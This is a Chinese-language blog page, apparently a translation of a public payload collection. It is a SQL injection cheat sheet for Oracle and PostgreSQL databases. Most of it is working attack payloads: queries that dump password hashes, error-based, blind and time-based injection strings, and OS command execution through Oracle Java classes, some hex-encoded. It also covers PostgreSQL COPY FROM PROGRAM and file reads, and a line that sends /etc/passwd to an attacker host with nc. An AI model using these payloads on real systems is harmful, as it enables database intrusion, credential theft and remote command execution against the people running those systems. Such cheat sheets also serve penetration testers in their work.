<h3 id="查询包含-user-字段在哪个库哪个表"><a href="#查询包含-user-字段在哪个库哪个表" class="headerlink" title="查询包含 user 字段在哪个库哪个表"></a>查询包含 user 字段在哪个库哪个表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">    owner AS database_name,</span><br><span class="line">    table_name,</span><br><span class="line">    column_name</span><br><span class="line">FROM </span><br><span class="line">    all_tab_columns</span><br><span class="line">WHERE </span><br><span class="line">    column_name LIKE &#x27;%USER%&#x27;</span><br><span class="line">ORDER BY </span><br><span class="line">    owner, table_name, column_name;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle-SQL-默认数据库"><a href="#Oracle-SQL-默认数据库" class="headerlink" title="Oracle SQL 默认数据库"></a>Oracle SQL 默认数据库</h3><table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>SYSTEM</td>
<td>适用于所有版本</td>
</tr>
<tr>
<td>SYSAUX</td>
<td>适用于所有版本</td>
</tr>
</tbody></table>
<h3 id="Oracle-SQL-注释"><a href="#Oracle-SQL-注释" class="headerlink" title="Oracle SQL 注释"></a>Oracle SQL 注释</h3><table>
<thead>
<tr>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>​<code>-- -</code>​</td>
<td>SQL comment</td>
</tr>
</tbody></table>
<h3 id="Oracle-SQL-版本"><a href="#Oracle-SQL-版本" class="headerlink" title="Oracle SQL 版本"></a>Oracle SQL 版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual UNION SELECT * FROM v$version</span><br><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#x27;Oracle%&#x27;;</span><br><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#x27;TNS%&#x27;;</span><br><span class="line">SELECT version FROM v$instance;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle-SQL-主机名"><a href="#Oracle-SQL-主机名" class="headerlink" title="Oracle SQL 主机名"></a>Oracle SQL 主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT host_name FROM v$instance; (Privileged)</span><br><span class="line">SELECT UTL_INADDR.get_host_name FROM dual;</span><br><span class="line">SELECT UTL_INADDR.get_host_name(&#x27;10.0.0.1&#x27;) FROM dual;</span><br><span class="line">SELECT UTL_INADDR.get_host_address FROM dual;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle-SQL-数据库名称"><a href="#Oracle-SQL-数据库名称" class="headerlink" title="Oracle SQL 数据库名称"></a>Oracle SQL 数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT global_name FROM global_name;</span><br><span class="line">SELECT name FROM V$DATABASE;</span><br><span class="line">SELECT instance_name FROM V$INSTANCE;</span><br><span class="line">SELECT SYS.DATABASE_NAME FROM DUAL;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle-SQL-数据库凭证"><a href="#Oracle-SQL-数据库凭证" class="headerlink" title="Oracle SQL 数据库凭证"></a>Oracle SQL 数据库凭证</h3><table>
<thead>
<tr>
<th>SQL 语句</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>​<code>SELECT username FROM all_users;</code>​</td>
<td>适用于所有版本</td>
</tr>
<tr>
<td>​<code>SELECT name, password from sys.user$;</code>​</td>
<td>Privileged, &lt;= 10g</td>
</tr>
<tr>
<td>​<code>SELECT name, spare4 from sys.user$;</code>​</td>
<td>Privileged, &lt;= 11g</td>
</tr>
</tbody></table>
<h3 id="Oracle-SQL-列出数据库"><a href="#Oracle-SQL-列出数据库" class="headerlink" title="Oracle SQL 列出数据库"></a>Oracle SQL 列出数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner FROM all_tables;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle-SQL-列出列"><a href="#Oracle-SQL-列出列" class="headerlink" title="Oracle SQL 列出列"></a>Oracle SQL 列出列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM all_tab_columns WHERE table_name = &#x27;blah&#x27;;</span><br><span class="line">SELECT column_name FROM all_tab_columns WHERE table_name = &#x27;blah&#x27; and owner = &#x27;foo&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle-SQL-列出表"><a href="#Oracle-SQL-列出表" class="headerlink" title="Oracle SQL 列出表"></a>Oracle SQL 列出表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM all_tables;</span><br><span class="line">SELECT owner, table_name FROM all_tables;</span><br><span class="line">SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE &#x27;%PASS%&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle-SQL-报错注入"><a href="#Oracle-SQL-报错注入" class="headerlink" title="Oracle SQL 报错注入"></a>Oracle SQL 报错注入</h3><table>
<thead>
<tr>
<th>Description</th>
<th>Query</th>
</tr>
</thead>
<tbody><tr>
<td>Invalid HTTP Request</td>
<td>​<code>SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual</code>​</td>
</tr>
<tr>
<td>CTXSYS.DRITHSX.SN</td>
<td>​<code>SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual</code>​</td>
</tr>
<tr>
<td>Invalid XPath</td>
<td>​<code>SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual</code>​</td>
</tr>
<tr>
<td>Invalid XML</td>
<td>​<code>SELECT to_char(dbms_xmlgen.getxml(&#39;select &quot;&#39;||(select user from sys.dual)||&#39;&quot; FROM sys.dual&#39;)) FROM dual</code>​</td>
</tr>
<tr>
<td>Invalid XML</td>
<td>​<code>SELECT rtrim(extract(xmlagg(xmlelement(&quot;s&quot;, username || &#39;,&#39;)),&#39;/s&#39;).getstringval(),&#39;,&#39;) FROM all_users</code>​</td>
</tr>
<tr>
<td>SQL Error</td>
<td>​<code>SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))</code>​</td>
</tr>
<tr>
<td>XDBURITYPE getblob</td>
<td>​<code>XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;)).getblob()</code>​</td>
</tr>
<tr>
<td>XDBURITYPE getclob</td>
<td>​<code>XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()</code>​</td>
</tr>
</tbody></table>
<p>When the injection point is inside a string use : <code>&#39;||PAYLOAD--</code>​</p>
<h3 id="Oracle-SQL-盲注"><a href="#Oracle-SQL-盲注" class="headerlink" title="Oracle SQL 盲注"></a>Oracle SQL 盲注</h3><table>
<thead>
<tr>
<th>Description</th>
<th>Query</th>
</tr>
</thead>
<tbody><tr>
<td>Version is 12.2</td>
<td>​<code>SELECT COUNT(*) FROM v$version WHERE banner LIKE &#39;Oracle%12.2%&#39;;</code>​</td>
</tr>
<tr>
<td>Subselect is enabled</td>
<td>​<code>SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)</code>​</td>
</tr>
<tr>
<td>Table log_table exists</td>
<td>​<code>SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);</code>​</td>
</tr>
<tr>
<td>Column message exists in table log_table</td>
<td>​<code>SELECT COUNT(*) FROM user_tab_cols WHERE column_name = &#39;MESSAGE&#39; AND table_name = &#39;LOG_TABLE&#39;;</code>​</td>
</tr>
<tr>
<td>First letter of first message is t</td>
<td>​<code>SELECT message FROM log_table WHERE rownum=1 AND message LIKE &#39;t%&#39;;</code>​</td>
</tr>
</tbody></table>
<h3 id="Oracle-SQL-时间注入"><a href="#Oracle-SQL-时间注入" class="headerlink" title="Oracle SQL 时间注入"></a>Oracle SQL 时间注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;[RANDSTR]&#x27;,[SLEEPTIME]) </span><br></pre></td></tr></table></figure>

<h4 id="Oracle-SQL-命令执行"><a href="#Oracle-SQL-命令执行" class="headerlink" title="Oracle SQL 命令执行"></a>Oracle SQL 命令执行</h4><ul>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3F1ZW50aW5oYXJkeS9vZGF0">ODAT (Oracle Database Attacking Tool)</a></li>
</ul>
<h4 id="Oracle-Java-Execution"><a href="#Oracle-Java-Execution" class="headerlink" title="Oracle Java Execution"></a>Oracle Java Execution</h4><ul>
<li><p>List Java privileges<br>​<code>sql select * from dba_java_policy select * from user_java_policy</code>​</p>
</li>
<li><p>Grant privileges<br>​<code>sql exec dbms_java.grant_permission(&#39;SCOTT&#39;, &#39;SYS:java.io.FilePermission&#39;,&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;,&#39;execute&#39;); exec dbms_java.grant_permission(&#39;SCOTT&#39;,&#39;SYS:java.lang.RuntimePermission&#39;, &#39;writeFileDescriptor&#39;, &#39;&#39;); exec dbms_java.grant_permission(&#39;SCOTT&#39;,&#39;SYS:java.lang.RuntimePermission&#39;, &#39;readFileDescriptor&#39;, &#39;&#39;);</code>​</p>
</li>
<li><p>Execute commands</p>
<ul>
<li>10g R2, 11g R1 and R2: <code>DBMS_JAVA_TEST.FUNCALL()</code>​<br>​<code>sql SELECT DBMS_JAVA_TEST.FUNCALL(&#39;oracle/aurora/util/Wrapper&#39;,&#39;main&#39;,&#39;c:\\windows\\system32\\cmd.exe&#39;,&#39;/c&#39;, &#39;dir &gt;c:\test.txt&#39;) FROM DUAL SELECT DBMS_JAVA_TEST.FUNCALL(&#39;oracle/aurora/util/Wrapper&#39;,&#39;main&#39;,&#39;/bin/bash&#39;,&#39;-c&#39;,&#39;/bin/ls&gt;/tmp/OUT2.LST&#39;) from dual</code>​</li>
<li>11g R1 and R2: <code>DBMS_JAVA.RUNJAVA()</code>​<br>​<code>sql SELECT DBMS_JAVA.RUNJAVA(&#39;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#39;) FROM DUAL</code>​</li>
</ul>
</li>
</ul>
<h4 id="Oracle-Java-Class"><a href="#Oracle-Java-Class" class="headerlink" title="Oracle Java Class"></a>Oracle Java Class</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/* create Java class */</span><br><span class="line">BEGIN</span><br><span class="line">EXECUTE IMMEDIATE &#x27;create or replace and compile java source named &quot;PwnUtil&quot; as import java.io.*; public class PwnUtil&#123; public static String runCmd(String args)&#123; try&#123; BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = &quot;&quot;;while ((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123; return e.toString();&#125;&#125; public static String readFile(String filename)&#123; try&#123; BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = &quot;&quot;;while((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123; return e.toString();&#125;&#125;&#125;;&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">EXECUTE IMMEDIATE &#x27;create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;PwnUtil.runCmd(java.lang.String) return String&#x27;&#x27;;&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">/* run OS command */</span><br><span class="line">SELECT PwnUtilFunc(&#x27;ping -c 4 localhost&#x27;) FROM dual;</span><br></pre></td></tr></table></figure>

<p>or (hex encoded)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* create Java class */</span><br><span class="line">SELECT TO_CHAR(dbms_xmlquery.getxml(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(&#x27;&#x27;637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d&#x27;&#x27;));</span><br><span class="line">EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(&#x27;&#x27;637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b&#x27;&#x27;)); end;&#x27;)) results FROM dual</span><br><span class="line"></span><br><span class="line">/* run OS command */</span><br><span class="line">SELECT PwnUtilFunc(&#x27;ping -c 4 localhost&#x27;) FROM dual;</span><br></pre></td></tr></table></figure>

<h3 id="References-1"><a href="#References-1" class="headerlink" title="References"></a>References</h3><blockquote>
<p>注：大部分内容翻译至：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdz">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9zcWx3aWtpLm5ldHNwaS5jb20vaW5qZWN0aW9uVHlwZXMvZXJyb3JCYXNlZC8jb3JhY2xl">NetSpi – SQL Wiki</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9vd2FzcC5vcmcvd3d3LXBkZi1hcmNoaXZlL0FTREMxMi1OZXdfYW5kX0ltcHJvdmVkX0hhY2tpbmdfT3JhY2xlX0Zyb21fV2ViLnBkZg==">ASDC12 – New and Improved Hacking Oracle From Web – OWASP</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L25ldHdvcmstc2VydmljZXMtcGVudGVzdGluZy8xNTIxLTE1MjItMTUyOS1wZW50ZXN0aW5nLW9yYWNsZS1saXN0ZW5lcg==">Pentesting Oracle TNS Listener – HackTricks</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3F1ZW50aW5oYXJkeS9vZGF0L3dpa2kvcHJpdmVzYw==">ODAT: Oracle Database Attacking Tool – quentinhardy</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly93d3cud2Vic2VjLmNhL2tiL3NxbF9pbmplY3Rpb24jT3JhY2xlX0RlZmF1bHRfRGF0YWJhc2Vz">WebSec CheatSheet – Oracle</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly93d3cubWFubnVsaW51eC5vcmcvMjAyMy8xMi9OZXctcGF5bG9hZC10by1leHBsb2l0LUVycm9yLWJhc2VkLVNRTC1pbmplY3Rpb24tT3JhY2xlLWRhdGFiYXNlLmh0bWw=">New payload to exploit Error-based SQL injection – Oracle database – Mannu Linux – 12&#x2F;09&#x2F;2023</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md</a></li>
</ul>
<h2 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h2><h3 id="PostgreSQL-命令执行"><a href="#PostgreSQL-命令执行" class="headerlink" title="PostgreSQL 命令执行"></a>PostgreSQL 命令执行</h3><h4 id="CVE-2019–9193"><a href="#CVE-2019–9193" class="headerlink" title="CVE-2019–9193"></a>CVE-2019–9193</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>

<h3 id="使用-libc-so-6"><a href="#使用-libc-so-6" class="headerlink" title="使用 libc.so.6"></a>使用 libc.so.6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT;</span><br><span class="line">SELECT system(&#x27;cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-注释"><a href="#PostgreSQL-注释" class="headerlink" title="PostgreSQL 注释"></a>PostgreSQL 注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-链注入点符号"><a href="#PostgreSQL-链注入点符号" class="headerlink" title="PostgreSQL 链注入点符号"></a>PostgreSQL 链注入点符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; #用于终止 SQL 命令。在语句中唯一可使用的位置是在字符串常量或引用标识符中。</span><br><span class="line">|| #或语句</span><br><span class="line"></span><br><span class="line"># 使用示例: </span><br><span class="line">/?whatever=1;(select 1 from pg_sleep(5))</span><br><span class="line">/?whatever=1||(select 1 from pg_sleep(5))</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-版本"><a href="#PostgreSQL-版本" class="headerlink" title="PostgreSQL 版本"></a>PostgreSQL 版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT version()</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-当前用户"><a href="#PostgreSQL-当前用户" class="headerlink" title="PostgreSQL 当前用户"></a>PostgreSQL 当前用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT user;</span><br><span class="line">SELECT current_user;</span><br><span class="line">SELECT session_user;</span><br><span class="line">SELECT usename FROM pg_user;</span><br><span class="line">SELECT getpgusername();</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-用户列表"><a href="#PostgreSQL-用户列表" class="headerlink" title="PostgreSQL 用户列表"></a>PostgreSQL 用户列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT usename FROM pg_user</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-密码哈希列表"><a href="#PostgreSQL-密码哈希列表" class="headerlink" title="PostgreSQL 密码哈希列表"></a>PostgreSQL 密码哈希列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT usename, passwd FROM pg_shadow </span><br></pre></td></tr></table></figure>

<h3 id="查询数据库管理员账户列表"><a href="#查询数据库管理员账户列表" class="headerlink" title="查询数据库管理员账户列表"></a>查询数据库管理员账户列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT usename FROM pg_user WHERE usesuper IS TRUE</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-权限列表"><a href="#PostgreSQL-权限列表" class="headerlink" title="PostgreSQL 权限列表"></a>PostgreSQL 权限列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</span><br></pre></td></tr></table></figure>

<h3 id="查询当前用户是否为超级用户"><a href="#查询当前用户是否为超级用户" class="headerlink" title="查询当前用户是否为超级用户"></a>查询当前用户是否为超级用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW is_superuser; </span><br><span class="line">SELECT current_setting(&#x27;is_superuser&#x27;);</span><br><span class="line">SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-数据库名称"><a href="#PostgreSQL-数据库名称" class="headerlink" title="PostgreSQL 数据库名称"></a>PostgreSQL 数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT current_database()</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-数据库列表"><a href="#PostgreSQL-数据库列表" class="headerlink" title="PostgreSQL 数据库列表"></a>PostgreSQL 数据库列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT datname FROM pg_database</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-表格列表"><a href="#PostgreSQL-表格列表" class="headerlink" title="PostgreSQL 表格列表"></a>PostgreSQL 表格列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM information_schema.tables</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-列表列"><a href="#PostgreSQL-列表列" class="headerlink" title="PostgreSQL 列表列"></a>PostgreSQL 列表列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;data_table&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-报错注入"><a href="#PostgreSQL-报错注入" class="headerlink" title="PostgreSQL 报错注入"></a>PostgreSQL 报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)</span><br><span class="line">,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--</span><br><span class="line">,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=&#x27;data_table&#x27;+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--</span><br><span class="line">,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)</span><br><span class="line"></span><br><span class="line">&#x27; and 1=cast((SELECT concat(&#x27;DATABASE: &#x27;,current_database())) as int) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;data_table&#x27; LIMIT 1 OFFSET data_offset) as int) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-XML-帮助器"><a href="#PostgreSQL-XML-帮助器" class="headerlink" title="PostgreSQL XML 帮助器"></a>PostgreSQL XML 帮助器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select query_to_xml(&#x27;select * from pg_user&#x27;,true,true,&#x27;&#x27;); -- 返回所有结果作为单个 xml 行</span><br><span class="line">select database_to_xml(true,true,&#x27;&#x27;); -- 将当前数据库转储为 XML</span><br><span class="line">select database_to_xmlschema(true,true,&#x27;&#x27;); -- 将当前数据库转储为 XML 架构</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-盲注"><a href="#PostgreSQL-盲注" class="headerlink" title="PostgreSQL 盲注"></a>PostgreSQL 盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(version(),1,10) = &#x27;PostgreSQL&#x27; and &#x27;1&#x27; -&gt; OK</span><br><span class="line">&#x27; and substr(version(),1,10) = &#x27;PostgreXXX&#x27; and &#x27;1&#x27; -&gt; KO</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-时间盲注"><a href="#PostgreSQL-时间盲注" class="headerlink" title="PostgreSQL 时间盲注"></a>PostgreSQL 时间盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1 from pg_sleep(5)</span><br><span class="line">;(select 1 from pg_sleep(5))</span><br><span class="line">||(select 1 from pg_sleep(5))</span><br><span class="line"></span><br><span class="line">select case when substring(datname,1,1)=&#x27;1&#x27; then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1</span><br><span class="line">select case when substring(table_name,1,1)=&#x27;a&#x27; then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1</span><br><span class="line">select case when substring(column,1,1)=&#x27;1&#x27; then pg_sleep(5) else pg_sleep(0) end from table_name limit 1</span><br><span class="line">select case when substring(column,1,1)=&#x27;1&#x27; then pg_sleep(5) else pg_sleep(0) end from table_name where column_name=&#x27;value&#x27; limit 1</span><br><span class="line"></span><br><span class="line">AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</span><br><span class="line">AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-堆叠查询"><a href="#PostgreSQL-堆叠查询" class="headerlink" title="PostgreSQL 堆叠查询"></a>PostgreSQL 堆叠查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/vuln.php?id=injection&#x27;;create table NotSoSecure (data varchar(200));--</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL-文件读取"><a href="#PostgreSQL-文件读取" class="headerlink" title="PostgreSQL 文件读取"></a>PostgreSQL 文件读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select pg_ls_dir(&#x27;./&#x27;);</span><br><span class="line">select pg_read_file(&#x27;PG_VERSION&#x27;, 0, 200);</span><br></pre></td></tr></table></figure>

